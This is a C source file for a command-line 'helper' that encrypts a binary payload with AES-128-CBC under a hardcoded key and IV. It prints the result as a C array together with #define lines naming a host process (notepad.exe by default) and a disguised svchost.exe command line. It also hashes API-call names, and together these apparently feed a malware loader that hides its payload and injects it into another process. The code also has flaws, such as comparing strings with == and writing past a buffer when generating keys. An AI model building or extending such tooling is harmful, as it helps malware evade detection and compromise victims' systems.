#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define CBC 1
#define AES128 1
#include "aes.h" 

static int gen_config(unsigned char*, uint32_t, char*, char*, char*);
static void gen_key_iv(unsigned char*, int , char*, int) ;


int main(int argc, char *argv[]) {
    if (argc > 5) {
        printf("[!] Too many arguments. \n"); 
        return 0;
    }
    else if ((argc == 2) || (argc == 3) || (argc == 5)) {
        if ((argc == 3) && (strcmp(argv[1], "h")) == 0) {
            char* apicall = argv[2];
            int len = strlen(argv[2]);
            uint32_t H = SuperFastHash(apicall, len);
            printf("[+] %s [Length: %d] = %u\n",argv[2], len, H);
            return 0;
        }
        if ((argc == 3) && (strcmp(argv[1], "hf")) == 0) {
            FILE *fp;
            fp = fopen(argv[2], "rb");
            if (fp == NULL) {
                printf("[!] Error opening the file %s\n", argv[2]);
                return -1;
            }
            fseek(fp, 0L, SEEK_END);
            int sz = ftell(fp);
            rewind(fp);
            unsigned char buf[sz]; // hmm
            fread(&buf, sizeof(unsigned char), sz, fp);
            uint32_t H = SuperFastHash(buf, sz);
            printf("[+] file: %s [Length: %d] = %u\n", argv[2], sz, H);
            return 0;
        }
        FILE *fp;
        fp = fopen(argv[1], "rb");
        if (fp == NULL) {
            printf("[!] Error opening the file %s\n", argv[1]);
            return -1;
        }
        fseek(fp, 0L, SEEK_END);
        int sz = ftell(fp);
        rewind(fp);
        unsigned char buf[sz]; // hmm
        fread(&buf, sizeof(unsigned char), sz, fp);
        char* outbin = "";
        if ( argc >= 3) { outbin = argv[2]; }
        // printf("\n[+] Encrypting: %s\n", argv[1]);
        
        if (argc == 5) {
            
            gen_config(buf, sz, outbin, argv[3], argv[4]);
        } else { gen_config(buf, sz, outbin, "notepad.exe", "C:\\Windows\\System32\\svchost.exe -k NetworkService");};
        return 0;
    }
    else {
        printf("\nUsage: helper infile.bin [encrypted_outfile.bin]\n    or helper h string\n    or helper infile.bin encrypted.bin svchost.exe \"C:\\\\Windows\\\\System32\\\\svchost.exe -k NetworkService\"\n\n");
        return 0;
    }
}

int gen_config(unsigned char* pbuf, uint32_t buflen, char* outfile, char* process_name, char* commandline){
    int og_buflen = buflen;
    int n = (16%buflen == 0) ? 0 : 16 - (buflen%16);
    unsigned char newbuf[buflen+n];
    if (n != 0) {
        // padding here and not de-padded after decryption
        // TODO: change padding int to length of padding for removal after decrypting
        memcpy(newbuf, (void**)pbuf, buflen);
        memset(&newbuf[buflen], n, n);
        buflen += n;
    } else { memcpy(newbuf, (void**)pbuf, buflen); }

    printf("\n#define X64PROC \"%s\"\n#define CMDLINE L\"%s\"", process_name, commandline);
    printf("\n#define PAYLOAD_HASH %u", SuperFastHash(newbuf, og_buflen));
    printf("\n#define ENCRYPTED_BIN_LEN %d", buflen);
    printf("\n#define OG_PAYLOAD_LEN %d\n\n", og_buflen);

    // uint8_t test_iv[16], test_key[16];

    // printf("[DEBUG] printing generated keys and iv:\n");
    // gen_key_iv(&test_iv, 16, "iv", 0); 
    // gen_key_iv(&test_key, 16, "key", 0);

    // printf("[DEBUG] ");
    // for (int i = 1; i <= 16; i++) { 
    //     printf("0x%.2x ", test_iv[i]);
        // printf("0x%.2x ", test_key[i]);
    // }
    // printf("\n");

    // printkeyandiv(&test_iv);
    // printkeyandiv(&test_key);

    uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    uint8_t key[] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
    printf("uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };\n");
    printf("uint8_t key[] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };\n");
    struct AES_ctx ctx, ctx2;
    AES_init_ctx_iv(&ctx, key, iv);
    // AES_init_ctx_iv(&ctx, key, iv);

    if (outfile == "") { outfile = "out_encrypted.bin"; }
    FILE* pFile;char* yourFilePath  = outfile;
    AES_CBC_encrypt_buffer(&ctx, newbuf, buflen);

    // check
    // AES_init_ctx_iv(&ctx2, key, iv);
    //  AES_CBC_decrypt_buffer(&ctx, newbuf, buflen);

    // int new_hash = SuperFastHash(newbuf, buflen); 
    // printf("[DEBUG] new hash: %d\n", new_hash);
    // if (og_hash == SuperFastHash(newbuf, buflen)) {
    //     printf("[DEBUG] decryption worked!\n");
        
    // }
    // AES_CBC_encrypt_buffer(&ctx, newbuf, buflen); // reencrypt
    // enc of check

    /* lil' printy */
    printf("\nunsigned char %s[] = { \n    ", "encrypted_bin");
    for (int i=0;i<buflen;i++) {
        if (i == (buflen-1)) {
            printf("0x%.2x\n};\n", newbuf[i]);
            break;
        }
        printf("0x%.2x, ", newbuf[i]);
        if ((i+1)%16 == 0) { printf("\n    "); }
    }
    

    /* Write your buffer to disk. */
    pFile = fopen(yourFilePath,"wb");

    if (pFile){
        fwrite(newbuf, buflen, 1, pFile);
        printf("\n\n");
    }
    else{
        printf("[!] Failed! \n");
        return -1;
    }
    fclose(pFile);
    return 0;
}


    /*
    https://stackoverflow.com/questions/3784263/converting-an-int-into-a-4-byte-char-array-c
    unsigned char bytes[4];
    unsigned long n = 175;

    bytes[0] = (n >> 24) & 0xff;
    bytes[1] = (n >> 16) & 0xff;
    bytes[2] = (n >> 8) & 0xff;
    bytes[3] = n & 0xff;
    */
void gen_key_iv(unsigned char* pbuf, int len, char* varname, int s) {
    srand(time(0));
    for (int i = 1; i <= len; i++) { 
        if (i == 1) { 
            printf("uint8_t %s[] = { ", varname); 
        } 
        if (i == len) {  
            pbuf[len] = (rand() >> s) & 0xff; 
            printf("0x%.2x };\n", pbuf[len]);
            break;  
        } 
        pbuf[i-1] = (rand() >> s) & 0xff;
        printf("0x%.2x, ", pbuf[i-1]);
   }
   return;
}

void printkeyandiv(unsigned char* pbuf){
    for (int i = 1; i <= 16; i++) 
    { 
        if (i == 1) { 
            printf("uint8_t %s[] = { ", "varname"); 
        } 
        if (i == 16) {  
            printf("0x%.2x };\n", pbuf[i]);
            break;  
        } 
        printf("0x%.2x, ", pbuf[i-1]);
    }
    return;

}